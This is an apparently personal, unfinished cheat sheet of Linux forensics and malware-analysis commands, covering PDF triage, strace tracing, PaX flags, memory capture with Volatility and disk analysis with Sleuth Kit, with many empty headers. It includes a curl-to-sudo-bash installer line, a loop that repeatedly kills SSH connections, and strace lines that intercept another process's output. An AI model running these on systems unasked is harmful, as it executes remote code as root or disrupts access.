## ---------------------------------------------------------------------- ##
	pdfid --recursedir /$Dir/		## Recurse directories
## ---------------------------------------------------------------------- ##


##-======================================-##
##   [+] Display contents of object id
##-======================================-##
pdf-parser.py --object id $File.pdf     


##-===================================-##
##   [+] decode the object’s stream
##-===================================-##
pdf-parser.py --object id --filter --raw $File.pdf



qpdf 



##-====================================-##
##   [+] Extract Flash (SWF) objects
##-====================================-##
swf_mastah.py -f $File.pdf -o $File





##-==========================================-##
##   [+] Extract files / scripts / Objects
##-==========================================-##
## ------------------------------------------ ##
##   [?] pdf-parser - extract js objects
## ------------------------------------------ ##
pdf-parser --object 32 --raw > extractedObject.js
pdf-parser --object 32 --raw > $File


##-==============================-##
##  [+] Analyze PDF and Exploit
##-==============================-##
pyew $File.pdf 	



##-===========================-##
##   [+] Force Parsing Mode
##-===========================-##
peepdf -fl $File.pdf
peepdf --interactive $File.pdf


##-=========================================-##
##   [+] Forensic Carve File For Metadata
##-=========================================-##
exiftool -a -u -g2 $File.pdf


##-========================================-##
##   [+] Get metadata recursivly from pwd
##-========================================-##
exiftool -r -ext pdf .


##-===========================-##
##    [+] Change an element
##-===========================-##
exiftool -Title="$Title" $File.pdf


##-===========================-##
##    [+] Remove metadata
##-===========================-##
exiftool -all= $File.pdf
exiftool -all:all= $File.pdf
qpdf --linearize $File.pdf $FileCleaned.pdf



mat $File.pdf


## ------------------------------------------------------------------- ##
    mat2 --lightweight $File    ## remove SOME metadata
## ------------------------------------------------------------------- ##
    mat2 --show $File           ## list harmful metadata detectable
## ------------------------------------------------------------------- ##
    mat2 --inplace $File        ## clean in place, without backup
## ------------------------------------------------------------------- ##



##-================================================================-##
##    [+] Remove metadata recursively from the current directory
##-================================================================-##
find . -name "*.pdf" -print0 | while read -d $'\0' file; do echo ${file:2} && mv ${file:2} ${file:2}.pdf && exiftool -all= ${file:2}.pdf && exiftool -all:all= ${file:2}.pdf && qpdf --linearize ${file:2}.pdf ${file:2} && rm ${file:2}.pdf && rm ${file:2}.pdf_original; done



##-===========================-##
##    [+] 
##-===========================-##
decode file $File.txt b64


##-===========================-##
##    [+] extracted the PE sections
##-===========================-##
7z x $File.exe -osections

##-===========================================-##
##    [+] use ClamAV for creating the sectional based MD5's
##    [+] PESectionSize:MD5:MalwareName
##-===========================================-##
sigtool --mdb $File

##-===========================================-##
##  [+] Using ClamAV's sigtool
##  [+] decompress its main signature datababase:
##-===========================================-##
sigtool -u $File.cvd


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##






##-=======================-##
##     [+] Common Syscalls:
##-=======================-##
access
close (close file handle)
fchmod (change file permissions)
fchown (change file ownership)
fstat (retrieve details)
lseek (move through file)
open (open file for reading/writing)
read (read a piece of data)
statfs (retrieve file system related details)



strace -e open                      			## Monitor opening of files: 
strace -e trace=read						## Trace Read Syscalls
strace -e trace=write						## Trace Write Syscalls
strace -e trace=$File -p $PID			## Trace Files for $PID
strace -e trace=$Desc -p $PID		## Trace File Descriptors for $PID


##-===============================================-##
##   [+] Trace all processes accessing /etc/cups Directory
##-===============================================-##
sudo strace -P /etc/cups -p $PID

##-============================-##
##   [+] Trace all Nginx processes
##-============================-##
sudo strace -e trace=network -p `pidof nginx | sed -e 's/ /,/g'`


strace -e trace=process                ## Trace process calls (like fork, exec)
strace -e trace=memory                ## Trace memory syscalls
strace -e trace=network                ## Trace memory syscalls

strace -i 						## print instruction pointer during system call
strace -t $Cmd				## print timestamp
strace -T						## Display syscall duration in the output
strace -c						## See what time is spend and where
strace -D						## run tracer process as a detached 
									## grandchild, not as parent
strace -v						## verbose mode
strace -f                       ## Trace child processes
strace -F						## attempt to follow vforks
strace -S						## sortby -- sort syscall counts by: 
strace -S time				## sortby - Time
strace -S calls				## sortby - syscalls
strace -S name			## sortby - Name
strace -x						## print non-ascii strings in hex
strace -xx						## print all strings in hex
strace -P $Dir							## Trace a process when interacting with a path
strace -o $File.txt					## Log strace output to a file
strace -e trace=$IPC				## Trace communication between processes (IPC)
strace -e trace=$Signal			## Trace process signal handling (like HUP, exit)
strace -e trace=$File				## Trace file related syscalls


##-==========================================-##
##    [+] Monitor whats written to stdout and stderr
##-==========================================-##
strace -f -e trace=write -e write=1,2 $Cmd >/dev/null


##-=================================================-##
##    [+] Summarise/profile system calls made by command
##-=================================================-##
strace -c $Cmd >/dev/null


##-=====================================-##
##    [+] List system calls made by command
##-=====================================-##
strace -f -e open $Cmd >/dev/null


##-==========================================-##
##    [+] 
##-==========================================-##
ltrace -f -e getenv $Cmd >/dev/null


##-==========================================-##
##    [+] intercept stdout/stderr of another process
##-==========================================-##
strace -ff -e trace=write -e write=1,2 -p $PID


##-===================================-##
##    [+] List files accessed by a command
##-===================================-##
strace -ff -e trace=file $Cmd 2>&1 | perl -ne 's/^[^"]+"(([^\\"]|\\[\\"nt])*)".*/$1/ && print'


##-===============================-##
##    [+] Slow the target PID
##    [+] print details for each syscall:
##-===============================-##
strace -p $PID

##-================================-##
##    [+] Slow the target PID and any 
##    [+] newly created child process, 
##    [+] printing syscall details:
##-================================-##
strace -fp $PID

##-=========================-##
##    [+] Slow the target PID
##    [+] record syscalls
##    [+] print a summary
##-=========================-##
strace -cp $PID

##-=========================-##
##    [+] Slow the target PID
##    [+] print open() syscalls
##-=========================-##
strace -eopen -p $PID

##-=================================-##
##    [+] Slow the target PID
##    [+] print open() and stat() syscalls
##-=================================-##
strace -eopen,stat -p $PID

##-=====================================-##
##    [+] Slow the target PID
##    [+] print connect() and accept() syscalls
##-=====================================-##
strace -econnect,accept -p $PID

##-======================================-##
##    [+] Slow the target command 
##    [+] see what other programs it launches
##-======================================-##
strace -qfeexecve $Cmd

##-============================-## och 
##-============================-##
##    [?] with (distorted) microsecond resolution:

strace -ttt -p $PID

##-===========================-##
##    [+] Slow the target PID
##    [+] print syscall durations 
##-===========================-##
##    [?] with (distorted) microsecond resolution:

strace -T -p $PID


##-===================================-##
##    [+] 
##-===================================-##
strace -tt -f -ff -p `pidof apache2`


##-===================================-##
##    [+] attach to an existing process
##    [+] output a specific kernel call 
##         for that process & all child processes
##-===================================-##
strace -f -p $PID -e $KernelSyscall



strace -p $! 2>&1 | head -5







pgrep -u root named							# Find the process ID of the named daemon:
pgrep -u root sshd
pgrep -u root,daemon



pcat -v $PID                        ## displays the location of each memory region that is being copied

pmap -d 7840                        ## Provide Libraries loaded by a running process with pmap
pmap -x $(pgrep java)
   

  /6/	   \6\
 /Y/		\Y\
(</_____\>)
	|	r-	|			## readable memory mapping
	|	w	|			## writable memory mapping
	|	x	|			## executable memory mapping
	|	s	|			## shared memory mapping or 
	|	p	|			## private mapping.
<#--------#>


##-================================-##
##    [+] process memory mapped files
##-================================-##
## ------------------------------------------------------------------------------ ##
##     [?] the process’s memory mapped (shared) files
## ------------------------------------------------------------------------------ ##
pmap -x 6 | grep "[r-][w-][x-][s][R-]"


cat /proc/$(pgrep $Process)/status | grep 


pidstat -p $PID	                ## gather resource consumption details for a specific target process


kill `lsof -t /home`		        ## Kill all processes that have files open under /home.

killall -9 sshd 
pkill -9 -u root sshd 
pkill -HUP syslogd                  ## Make syslog reread its configuration file:


##-==================================================-##
##    [+] kill all sshd processes whose parent process ID is 1:
##-==================================================-##
pkill -P 1 sshd				## kills only the master sshd process leaving all of the users on the system still logged in.


 
##-==============================================-##
##    [+] pull out just the PID of the master SSH daemon:
##-==============================================-##
netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f1 -d/


##-==========================================-##
##    [+] Killing that process just requires appropriate use of backticks:

kill `netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f1 -d/`


##-==========================================-##
##    [+] Monitor open connections for httpd 
##-==========================================-##
##    [?] including listen, count and sort it per IP

watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"



watch -n 1 lsof -nPi tcp:22
while :; do kill -9 `lsof -t -i :22`; done





##-==========================================-##
##    [+] Display the top ten running processes
##    [+] sorted by memory usage
##-==========================================-##
ps aux | sort -nk +4 | tail








##-==========================================-##
##    [+] 
##-==========================================-##
systemd-analyze dump






##-==========================================-##
##    [+] 
##-==========================================-##
openssl dgst -sha256 -verify ${PUBKEY_FILE} -signature ${SIG_FILE} ${TMP_FILE}







##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##




ELF binaries and shared libraries now can be marked as requiring executable stack or not requiring it.  
This marking is done through the p_flags field in the PT_GNU_STACK program header entry. 


##-==========================================-##
##    [+] override this at assembly time:

(through  --exec‐stack or --noexecstack assembler options), 
 

##-==========================================-##
##    [+] override this at link time:

(through -z execstack or -z noexecstack linker options)




## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		|   -   |			##		executable  stack  is not required
 ## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
 		|	X   | 			##		executable stack is required
 ## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		|	?   |  		##		Undetermined if object requires or doesnt require executable stack
## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##

## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		execstack --set-execstack          ## Mark binary or shared library as requiring executable stack.
## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		execstack --clear-execstack       ## Mark binary or shared library as not requiring executable stack.
## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		execstack --query            			## Query executable stack marking of binaries and shared libraries.
## ----------------------------------------------------------------------------------------------------------------------------------------------------------------- ##


## ================================================================= ##
## 		To check if a library has executable stack enabled, run:
## ================================================================= ##
execstack -q /usr/lib/libcrypto.so.0.9.8


## ================================================================= ##
## 		query the status of all libraries in your system, run:
## ================================================================= ##
find /lib /usr/lib -name '*.so.*.*.*' | xargs execstack







cat /proc/cmdline | xxd

od -c --strings 
objdump --section-headers 
objdump --disassemble --section=.text 
objdump --syms           #
objdump --all-headers         #



## ================================================================= ##
##   [+] Examining the initramfs contents
## ================================================================= ##




## ================================================================= ##
echo "unpack the contents of the initramfs into the current directory."
## ================================================================= ##
zcat /boot/initrd.img-3.2.0-2-686-pae | cpio -i


## ================================================================= ##
list the contents of an initramfs using the cpio -t option or the command
## ================================================================= ##
lsinitramfs /boot/initrd.img-*


grep -w init_task /boot/System.map-



dpkg-reconfigure linux-image-



## ================================================================= ##
echo "Lets take a look at the initrd image and its hidden systemd agenda:"
## ================================================================= ##
strings /sbin/init | grep -i systemd

/lib/modules/`uname -r`/vmlinux or /usr/lib/debug/lib64/modules/`uname -r`/vmlinux


readelf -h vmlinux





6. Make sure debugfs is mounted
mount -t debugfs none_debugfs /sys/kernel/debug/






build the kernel with CONFIG_DEBUG_INFO=y

install the kernel-debuginfo




ln -s /usr/share/dwarves/runtime/* .
make CLASS=sock # to trace struct sock methods, this one is safe


load the resulting module:

insmod ctracer.ko



Get the log:
cat /sys/kernel/debug/ctracer0 > /tmp/ctracer.log

Generate the callgraph

make callgraph




readelf -l "$1" 2>/dev/null | grep -q 'GNU_RELRO'
readelf -d "$1" 2>/dev/null | grep -q 'BIND_NOW'
readelf -s "$1" 2>/dev/null | grep -q '__stack_chk_fail'
readelf -W -l "$1" 2>/dev/null | grep 'GNU_STACK' | grep -q 'RWE'
readelf -h "$1" 2>/dev/null | grep -q 'Type:[[:space:]]*EXEC'
readelf -h "$1" 2>/dev/null | grep -q 'Type:[[:space:]]*DYN'
readelf -d "$1" 2>/dev/null | grep -q '(DEBUG)'
readelf -d "$1" 2>/dev/null | grep -q 'rpath'
readelf -d "$1" 2>/dev/null | grep -q 'runpath'


readelf -s $FS_libc | grep _chk@@ | awk '{ print $8 }' | cut -c 3- | sed -e 's/_chk@.*//') )
readelf -s "$1" | awk '{ print $8 }' | sed 's/_*//' | sed -e 's/@.*//') )


readelf -l "$1/exe" 2>/dev/null | grep -q 'Program Headers'
readelf -l "$1/exe" 2>/dev/null | grep -q 'GNU_RELRO'
readelf -d "$1/exe" 2>/dev/null | grep -q 'BIND_NOW'
readelf -s "$1/exe" 2>/dev/null | grep -q 'Symbol table'
readelf -s "$1/exe" 2>/dev/null | grep -q '__stack_chk_fail'
readelf -W -l "$1/exe" 2>/dev/null | grep 'GNU_STACK' | grep -q 'RWE'
readelf -h "$1/exe" 2>/dev/null | grep -q 'Type:[[:space:]]*EXEC'
readelf -h "$1/exe" 2>/dev/null | grep -q 'Type:[[:space:]]*DYN'
readelf -d "$1/exe" 2>/dev/null | grep -q '(DEBUG)'

readelf -s "$1/exe" | awk '{ print $8 }' | sed 's/_*//' | sed -e 's/@.*//')




file -L "$file" 2>/dev/null | egrep -i -q 'script|exec|ELF|object|stripped|linked' || return 1





echo "## ======================================================================================= ##"
echo -e "\t\t\t[•] M Represents :[Enabled]: flags"
echo -e "\t\t\t[•] m Represents :[Disabled flags"
echo "## ======================================================================================= ##"



“/home/user/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/Browser/firefox”


echo "<+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+>"
echo -e "\t\t\t\t[+] :[PaX]: flags"
echo "<+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+>"
echo "## ===================================================== ##"
echo -e "\t\t[•]  P/p: Enable/disable PAGEXEC"
echo -e "\t\t[•]  E/e: Enable/disable EMUTRAMP"
echo -e "\t\t[•]  M/m: Enable/disable MPROTECT"
echo -e "\t\t[•]  R/r: Enable/disable RANDMAP"
echo -e "\t\t[•]  X/x: Enable/disable RANDEXEC"
echo -e "\t\t[•]  S/x: Enable/disable SEGMEXEC"
echo "## ===================================================== ##"




echo "## ======================================================================================= ##"
echo -e "\t\t[?] A detailed description of these flags can be found on the following page:"
echo "       ## https://en.wikibooks.org/wiki/Grsecurity/Appendix/PaX_Flags"
echo "## ======================================================================================= ##"




## Set flags on a single binary
sudo paxrat -s pm -b /usr/lib/iceweasel/iceweasel 


## Set all flags from a config file
sudo paxrat -c paxrat.conf 

 
## Test to make sure the provided config file is valid
sudo paxrat -c paxrat.conf -t


## Run in watcher mode
sudo paxrat -c paxrat.conf -w





##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##




# Configuration

paxrat configuration is provided via a JSON file that lists each binary, the 
PaX flags, and a `nonroot` setting to specify whether the target binary is 
not root-owned (paxrat will not set PaX flags on non-root owned binaries unless
this is set to `true`). By default paxrat will look for binary divertions using
`dpkg-divert`, this can be disabled by using the `nodivert` setting.

## Configuration example

The following is an example configuration:
```json
{
  "/usr/lib/iceweasel/iceweasel": {                                                     
    "flags": "pm"
  },                                                                            
  "/usr/lib/iceweasel/plugin-container": {                                                                  
    "flags": "m"
  },
  "/home/user/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/Browser/firefox": {
    "flags": "pm",
    "nonroot": true
  }
}





getfattr ‐n user.pax.flags /usr/bin/python3.2
setfattr ‐n user.pax.flags ‐v P /usr/bin/python3.2
getfattr ‐n user.pax.flags /usr/bin/python3.2




gradm -P
gradm -E


Roles: Users and groups on the system
Subjects: Processes and directories
Objects: Files and PaX flags



##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##



strace
proc
truss
ltrace
ptrace







##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##



perf list


--with-summary
           Show all syscalls followed by a summary




perf trace record           @@ automatically include the raw_syscalls events when writing events to a file.





perf trace --call-graph dwarf.


/proc/sys/kernel/perf_event_max_stack




 Trace only major pagefaults:
perf trace --no-syscalls -F

       Trace syscalls, major and minor pagefaults:
perf trace -F all



perf record --dry-run -e can act as a BPF script compiler if llvm.dump-obj in config file is set to true.














       The same eBPF program can be attached to multiple events and different eBPF programs can access the same map:

           tracing     tracing    tracing    packet      packet     packet
           event A     event B    event C    on eth0     on eth1    on eth2
            |             |         |          |           |          ^
            |             |         |          |           v          |
            --> tracing <--     tracing      socket    tc ingress   tc egress
                 prog_1          prog_2      prog_3    classifier    action
                 |  |              |           |         prog_4      prog_5
              |---  -----|  |------|          map_3        |           |
            map_1       map_2                              --| map_4 |--




The  kernel  contains  a just-in-time (JIT) compiler that translates eBPF bytecode into native machine code for
       better performance. 


/proc/sys/net/core/bpf_jit_enable

0  Disable JIT compilation (default).

       1  Normal compilation.

       2  Debugging mode.  The generated opcodes are dumped in hexadecimal into the kernel  log.   These  opcodes  can
          then be disassembled using the program tools/net/bpf_jit_disasm.c provided in the kernel source tree.


'echo "2" > /proc/sys/net/core/bpf_jit_enable

CONFIG_BPF_JIT_ALWAYS_ON

Documentation/networking/filter.txt


seccomp
tc-bpf
perf_event_open




hexdump -C

# byte# & ASCII with control chars
echo hello | hexdump -v  -e '/1  "%_ad#  "' -e '/1 " _%_u\_\n"'

hex bytes
echo hello | hexdump -v -e '/1 "%02X "' ; echo

hex bytes, with ASCII section
echo hello | hexdump -e '8/1 "%02X ""\t"" "' -e '8/1 "%c""\n"'

# hex with preceding 'x'
echo hello | hexdump -v -e '"x" 1/1 "%02X" " "' ; echo

# one hex byte per line
echo hello | hexdump -v -e '/1 "%02X\n"

# a table of byte#, hex, decimal, octal, ASCII
echo hello | hexdump -v  -e '/1  "%_ad#    "' -e '/1    "%02X hex"' -e '/1 " = %03i dec"' -e '/1 " = %03o oct"' -e '/1 " = _%c\_\n"'



echo hello | hexdump -v -e '/1 "%02X "' ; echo

echo hello | hexdump -v -e '"x" 1/1 "%02X" " "' ; echo      # hex with preceding 'x'


od -A x -t x1z -v            ## Display hexdump format output


xxd -l 120 -c 12 xxd.1              ## Hexdump the first 120 bytes with 12 octets per line.

xxd -l 120 -ps -c 20 xxd.1          ## Print 120 bytes as continuous hexdump with 20 octets per line.

xxd -s 0x36 -l 13 -c 13 xxd.1       ## Display just the date from the file xxd.1



##-=================================================================================================-##
##   [+] Rewind stdin before reading (Required) - Because `cat' already read to the end of stdin.
##-=================================================================================================-##
sh -c "cat > plain_copy; xxd -s 0 > hex_copy" < file


##-==============================================================-##
##  [+] Hexdump from file position 0x480 (=1024+128) onwards.
##  [?] The + sign means relative to the current position, 
##  [?] thus the 128 adds to the 1k where dd left off.
##-==============================================================-##
sh -c "dd of=plain_snippet bs=1k count=1; xxd -s +128 > hex_snippet" < file

##-==============================================================-##
##  [+] Hexdump from file position 0x100 ( = 1024-768) on.
##-==============================================================-##
sh -c "dd of=plain_snippet bs=1k count=1; xxd -s +-768 > hex_snippet" < file





Risky PDF Format Tags

 - /OpenAction and /AA specify the script or action to run automatically.

 - /JavaScript and /JS specify JavaScript to run.

 - /GoTo changes the view to a specified destination within the PDF or in another PDF file.

 - /Launch can launch a program or open a document.

 - /URI accesses a resource by its URL.

 - /SubmitForm and /GoToR can send data to URL.

 - /RichMedia can be used to embed Flash in a PDF.

 - /ObjStm can hide objects inside an Object Stream.

 - 






## PDF File Analysis Commands

peepdf.py -fl $File.pdf         ## Examine file.pdf for risky tags and malformed objects.



pdfid.py $File.pdf                ## Scan file.pdf for risky keywords and dictionary entries.


pdf-parser.py --object id $File.pdf     ## Display contents of object id in



pdf-parser.py --object id --filter --raw $File.pdf     ## decode the object’s stream.



qpdf 


swf_mastah.py -f $File.pdf -o out        ## Extract Flash (SWF) objects from



##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##

##-==============================================================-##
##  [+] 
##-==============================================================-##


##-============================================================================-##
##  [+] 
##-============================================================================-##
## ---------------------------------------------------------------------------- ##
##  1). 
##  2). 
##  3). 
## ---------------------------------------------------------------------------- ##


##-============================================================================-##
##  [+] 
##-============================================================================-##
## ---------------------------------------------------------------------------- ##
##  1). 
##  2). 
##  3). 
## ---------------------------------------------------------------------------- ##



##-============================================================================-##
##  [+] 
##-============================================================================-##
## ---------------------------------------------------------------------------- ##
##  1). 
##  2). 
##  3). 
## ---------------------------------------------------------------------------- ##


##-============================================================================-##
##  [+] 
##-============================================================================-##
## ---------------------------------------------------------------------------- ##
##  1). 
##  2). 
##  3). 
## ---------------------------------------------------------------------------- ##





insmod lime.ko "path=/mnt/externaldrive/memdmp.lime format=lime"




https://github.com/halpomeranz/lmg


python vol.py --info | grep Linux

python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pslist
python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pstree
python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_proc_maps -p 1
python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_dump_map -p 1 -s 0x400000 -D dump




readelf -h                          ## displays the header information

readelf -S                          ## displays the section headers

readelf -l                          ## shows the headers along with their type, 
                                    ## virtual address at which they will load, 
                                    ## and on-disk and in-memory size.

readelf -r                          ## displays relocation entries










/proc/<pid>/status




## Dynamic Shared Object
readelf -h /proc/1/exe



## Symbol table '.dynsym'
readelf -s /proc/1/exe

## Dynamic section
readelf -d /proc/1/exe

## files segment headers
readelf -l /proc/1/exe


pkaction --verbose













Evidence Image File Support
===========================
1. raw (Single raw file (dd))
2. aff (Advanced Forensic Format)
3. afd (AFF Multiple File)
4. afm (AFF with external metadata)
5. afflib (All AFFLIB image formats (including beta ones))
6. ewf (Expert Witness format (encase))
7. split raw (Split raw files) via affuse
___ 7.1 affuse ‐ mount 001 image/split images to view single raw file and metadata
8. split ewf (Split E01 files) via mount_ewf.py
___ 8.1 mount_ewf.py ‐ mount E01 image/split images to view single raw file and metadata
___ 8.2 ewfmount – mount E01 images/split images to view single rawfile and metadata






Forensic Analysis - Supported Filesystems
---------------------

1. ntfs (NTFS)
2. iso9660 (ISO9660 CD)
3. hfs (HFS+)
4. raw (Raw Data)
5. swap (Swap Space)
6. memory (RAM Data)
7. fat12 (FAT12)
8. fat16 (FAT16)
9. fat32 (FAT32)
10. ext2 (EXT2)
11. ext3 (EXT3)
12. ext4 (EXT4)
13. ufs1 (UFS1)
14. ufs2 (UFS2)
15. vmdk






##-========================================================-##
##   [+] SIFT Workstation - Curl Automated Installation
##-========================================================-##
curl --silent -L https://raw.github.com/sans-dfir/sift-bootstrap/master/bootstrap.sh | sudo bash -s -- -i










##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##



dd status=progress if=OPNsense-18.1.r1-OpenSSL-nano-amd64.img of=/dev/mmcblk0p1
dd status=progress if=HardenedBSD-aarch64-12.0-HARDENEDBSD-13634f1e55e-RaspberryPi3.img of=/dev/mmcblk0
dc3dd verb=on log=/home/xe1phix/BSD.log hash=sha1 if=HardenedBSD-aarch64-12.0-HARDENEDBSD-13634f1e55e-RaspberryPi3.img of=/dev/mmcblk0

time dd status=progress if=OPNsense-18.1.r1-OpenSSL-nano-amd64.img of=/dev/mmcblk0p1
time dc3dd verb=on log=/home/xe1phix/BSD.log hash=sha1 if=HardenedBSD-aarch64-12.0-HARDENEDBSD-13634f1e55e-RaspberryPi3.img of=/dev/mmcblk0




##-============================================================================-##
##  [+] 
##-============================================================================-##
## ---------------------------------------------------------------------------- ##
##  1). 
##  2). 
##  3). 
## ---------------------------------------------------------------------------- ##








  •  Raw linear sample (dd)
  •  EWF format (E01)
  •  QEMU virtual machine dumps



volatility --info



volatility -f $File imageinfo
volatility -f $File kdbgscan

export VOLATILITY_PROFILE=


volatility -f $File.dd --profile=Linux_













istat /dev/$Disk            ## Use istat to view file informaMon (including extended attributes)	



##-==============================================================-##
##  [+] View a specific extended attribute using The Sleuth Kit	
##-==============================================================-##
icat /dev/disk# <CNID>-<TSK Attribute Number>




hexedit -s raw/ewf1                 ## analyze the raw image
--sector


od
hdump
hexdump
bpe
hexed
beav




##-=============================================================-##
##  [+] Create Unallocated Image (deleted data) using blkls
##-=============================================================-##
blkls $imagefile.dd > $unallocated_imagefile.blkls






##-========================================================================-##
##  [+] foremost Carves out files based on headers and footers
##-========================================================================-##
## ------------------------------------------------------------------------ ##
##  [?] data_file.img = raw data, slack space, memory, unallocated space
## ------------------------------------------------------------------------ ##
foremost –o $outputdir –c /$path/$foremost.conf $data_file.img





runs tcpdump/snoop and generates the log file
chaosreader  -s  10  

chaosreader -S 5,12

chaosreader -S 2,5      # Standalone, sniff network 5 times for 2 min



tcpdump -s9000 -w output1        # create tcpdump capture file
chaosreader output1              # extract recognised sessions, or,

chaosreader -ve output1          # gimme everything, or,

chaosreader -p 20,21,23 output1  # only ftp and telnet...



chaosreader --dir				## Output all files to this directory
chaosreader --verbose			## 
chaosreader -ve $File			## Create HTML 2-way & hex files for everything
chaosreader -p $Ports $File		## only ftp and telnet
chaosreader -s 10 				## runs tcpdump for 10 minutes and generates the log file
chaosreader --ipaddr $IP		## Only examine these IPs
chaosreader --filter 'port 7'	## Dump Filter - Port #
chaosreader --port 21,23		## Only examine these ports (TCP & UDP)
chaosreader --preferdns			## Show DNS names instead of IP addresses.
chaosreader --sort type			## Sort Order: type
chaosreader --sort ip			## Sort Order: ip



sigfind  searches through a file and looks for the hex_signature at a given offset.  
This can be used to search fwor lost boot sectors, superblocks, and partition tables.
       
sigfind -o 510 -l AA55 disk.dd

sigfind -t fat disk.dd





sigfind $HexValue -o $Offset                ## sigfind - search for a binary value at a given offset (-o)


fsstat $Image.dd                            ## fsstat - Displays details about the file system

blkcat $Image.dd $BlockNum                  ## blkcat - Displays the contents of a disk block

blkls $Image.dd > imagefile.blkls           ## blkls - Lists contents of deleted disk blocks

blkcalc $Image.dd -u $blkls_num             ## blkcalc - Maps between dd images and blkls results

blkstat $Image.dd $ClusterNum               ## blkstat - Display allocation status of block



istat $Image.dd $InodeNum                   ## istat - Displays information about a specific inode

icat $Image.dd $InodeNum                    ## icat - Displays contents of blocks allocated to an inode

ifind $Image.dd –d $InodeNum                ## ifind - Determine which inode contains a specific block

ils $Image.dd                               ## ils - Displays inode details




fls -rpd $Image.dd                          ## fls - Displays deleted file entries in a directory inode

ffind $Image.dd $InodeNum                   ## ffind - Find the filename that using the inode










autopsy - Autopsy Forensic Browser



autopsy -p 8888 10.1.34.19



-d dir: specify the evidence locker directory
  -i device filesystem mnt: Specify info for live analysis
  -p port: specify the server port (default: 9999)
  remoteaddr: specify the host with the browser (default: localhost)






























istat /dev/$Disk            ## Use The Sleuth Kit to view file informaMon 
                            ## including extended a2ributes.	


##-==============================================================-##
##  [+] View a specific extended attribute using The Sleuth Kit	
##-==============================================================-##
icat /dev/disk# <CNID>-<TSK Attribute Number>




hexedit -s raw/ewf1                 ## analyze the raw image





##-=============================================================-##
##  [+] Create Unallocated Image (deleted data) using blkls
##-=============================================================-##
blkls $imagefile.dd > $unallocated_imagefile.blkls






##-========================================================================-##
##  [+] foremost Carves out files based on headers and footers
##-========================================================================-##
## ------------------------------------------------------------------------ ##
##  [?] data_file.img = raw data, slack space, memory, unallocated space
## ------------------------------------------------------------------------ ##
foremost –o $outputdir –c /$path/$foremost.conf $File.img


##-===================================================================-##
##  [+] sigfind - search for a binary value at a given offset (-o)
##-===================================================================-##
sigfind $HexValue -o $Offset




##-========================================================-##
##  [+] fsstat - Displays details about the file system
##-========================================================-##
fsstat $Image.dd


##-========================================================-##
##  [+] blkcat - Displays the contents of a disk block
##-========================================================-##
blkcat $Image.dd $BlockNum



##-======================================================-##
##  [+] blkls - Lists contents of deleted disk blocks
##-======================================================-##
blkls $Image.dd > imagefile.blkls



##-============================================================-##
##  [+] blkcalc - Maps between dd images and blkls results
##-============================================================-##
blkcalc $Image.dd -u $blkls_num


##-======================================================-##
##  [+] blkstat - Display allocation status of block
##-======================================================-##
blkstat $Image.dd $ClusterNum


##-=============================================================-##
##  [+] istat - Displays information about a specific inode
##-=============================================================-##
istat $Image.dd $InodeNum



##-==================================================================-##
##  [+] icat - Displays contents of blocks allocated to an inode
##-==================================================================-##
icat $Image.dd $InodeNum


##-==================================================================-##
##  [+] ifind - Determine which inode contains a specific block
##-==================================================================-##
ifind $Image.dd –d $InodeNum



##-==================================================================-##
##  [+] fls - Displays deleted file entries in a directory inode
##-==================================================================-##
fls -rpd $Image.dd


##-========================================================-##
##  [+] ffind - Find the filename that using the inode
##-========================================================-##
ffind $Image.dd $InodeNum




##-========================================================-##
##  [+] bulk_extractor - 
##-========================================================-##
bulk_extractor <options> –o output_dir image


bulk_extractor -F keywords.txt –e net -e aes -e wordlist -o /cases/bulk-extractor-memory-output /cases/memory-raw.001








##-==============================================================-##
##  [+] Find partition starting sector
##-==============================================================-##






##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##






##-============================================================-##
##  [+] Create unallocated Image (deleted data) using blkls
##-============================================================-##
blkls $Image.dd > unallocated_imagefile.blkls


##-========================================================-##
##  [+] Create Slack Image Using dls (for FAT and NTFS)
##-========================================================-##
blkls -s $Image.dd > imagefile.slack


##-================================================================-##
##  [+] Foremost Carves out files based on headers and footers
##-================================================================-##
foremost -o outputdir -c /path/to/foremost.conf $File.img


##-====================================================================-##
##  [+] Sigfind - search for a binary value at a given offset (-o)
##-====================================================================-##
sigfind <hexvalue> -o <offset> $Image.img







##-====================================================-##
##  [+] ASCII string search and list the byte offset
##-====================================================-##
srch_strings -t d $Image.dd > $Image.ascii.str



##-====================================================-##
##  [+] uNICODE string search and list byte offset
##-====================================================-##
